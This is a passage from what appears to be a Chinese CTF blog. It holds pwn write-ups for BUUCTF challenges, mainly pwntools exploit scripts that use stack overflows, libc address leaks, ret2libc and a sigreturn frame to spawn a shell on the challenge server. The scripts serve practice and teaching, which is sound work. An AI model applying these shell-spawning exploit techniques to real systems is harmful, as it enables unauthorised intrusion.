class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fourth time, we can get the address of libc</span></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">rc = io.recv()</span><br><span class="line"><span class="built_in">print</span>(rc)</span><br><span class="line">libc_start_main = u32(rc[-<span class="number">5</span>:-<span class="number">1</span>]) - <span class="number">241</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line"></span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh: &#x27;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(cyclic(<span class="number">0x20</span>) + p32(binsh) * <span class="number">3</span> +  p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line"><span class="comment"># return to vul to adjust stack environment</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu029-jarvisoj-tell-me-something"><a href="#buu029-jarvisoj-tell-me-something" class="headerlink" title="buu029-jarvisoj_tell_me_something"></a>buu029-jarvisoj_tell_me_something</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27850</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your message:\n&#x27;</span>, cyclic(<span class="number">0x88</span>) + p64(<span class="number">0x400620</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu030-ciscn-2019-s-3"><a href="#buu030-ciscn-2019-s-3" class="headerlink" title="buu030-ciscn_2019_s_3"></a>buu030-ciscn_2019_s_3</h1><p>这道题一看汇编，明摆着是考我们系统调用。其中有mov rax, 3bh，3b就是execve的系统调用号。之后需要在rdi中传入’&#x2F;bin&#x2F;sh’的地址，但是原程序中并没有这个字符串。</p>
<p>目前有一个主要的问题：如果要自己构造’&#x2F;bin&#x2F;sh’或者是查找libc，如何获取这个字符串的地址？通过ret2csu我们可以很容易地将任意值pop到rdi中，所以关键就在于如何获取字符串地址。如果这个字符串自己构造，栈上的地址一般都不容易获取到。如果要查找libc，那么首先要获取libc基址。前面已经提到我们无法直接通过sys_write打印，但同时我们也不要忘记，返回地址不一定要是函数的开头。如果在读写函数返回后编写gadget，直接返回到写30字节的地方，那么我们就能够直接进行打印，此时write打印出的数据中有部分是我们没有修改的，且返回之后我们能够将rsp抬高8字节获取到更加靠前的栈区内容，也就有机会能够获取到libc的基址。</p>
<p><img src="https://img-blog.csdnimg.cn/47bedf4bdae240d0824554966960e1ea.png"><br>上图中libc的基址正好在打印地址之后0x30的位置，所以还需要再返回两次，与第28题的方法相同。这种方法笔者称之为碰瓷流，与这道题的出题人本意不符。</p>
<p>exp：（调用system(‘&#x2F;bin&#x2F;sh’)）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28675</span>)</span><br><span class="line"></span><br><span class="line">write = <span class="number">0x400503</span></span><br><span class="line">read_write = <span class="number">0x4004ed</span></span><br><span class="line">poprdi_ret = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(write)	<span class="comment"># We use write twice to make rsp go up to reach the &#x27;__libc_start_main&#x27;</span></span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(read_write)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u64(io.recv()[-<span class="number">8</span>:]) - <span class="number">231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>本题实际上考察的是sigreturn的使用。说得简单点就是通过sigreturn（调用号0xF）的系统调用能够返回到用户状态，而这个用户状态的结构体就在sigreturn后的栈空间中，由此可以进行伪造。具体原理参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/zsj2102/article/details/78561112?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165259846916781818710887%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165259846916781818710887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-78561112-null-null.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=sigreturn&spm=1018.2226.3001.4187">资料</a>。在pwnfiles中为我们提供了伪造sigreturn结构体的类SigreturnFrame方便我们构造。</p>
<p>exp：（调用sigreturn，binsh地址仍然采用碰瓷方式获取）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28675</span>)</span><br><span class="line"></span><br><span class="line">write = <span class="number">0x400503</span></span><br><span class="line">read_write = <span class="number">0x4004ed</span></span><br><span class="line">poprdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">poprsir15_ret = <span class="number">0x4005a1</span></span><br><span class="line">movrax3b_ret = <span class="number">0x4004e2</span></span><br><span class="line">movrax0f_ret = <span class="number">0x4004da</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(read_write)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u64(io.recv()[-<span class="number">8</span>:]) - <span class="number">231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys - libc_start_main))</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(movrax0f_ret)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload += flat(frame)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>同时我们发现，我们能够通过write打印出栈区某处的地址，与当前rsp的差值固定。因此还可以直接通过read读取’&#x2F;bin&#x2F;sh’字符串到栈上，再通过write获取栈区地址以获取我们构造的’&#x2F;bin&#x2F;sh’的地址。此种方法清参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52231248/article/details/121361488?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165259686716782350962406%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165259686716782350962406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121361488-null-null.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=ciscn_2019_s_3&spm=1018.2226.3001.4187">别人写的wp</a>。</p>
<p>由此，这道题获取’&#x2F;bin&#x2F;sh’地址有两种方法，getshell也有两种方法，组合一下就能写出4种不同的exp。在学习过程中，不能以做出来题为目标，而应深入思考内部的原理，以及有没有其他的方法。</p>
<h1 id="buu031-jarvisoj-level3"><a href="#buu031-jarvisoj-level3" class="headerlink" title="buu031-jarvisoj_level3"></a>buu031-jarvisoj_level3</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27404</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">140</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">read = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">base = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">140</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">81</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
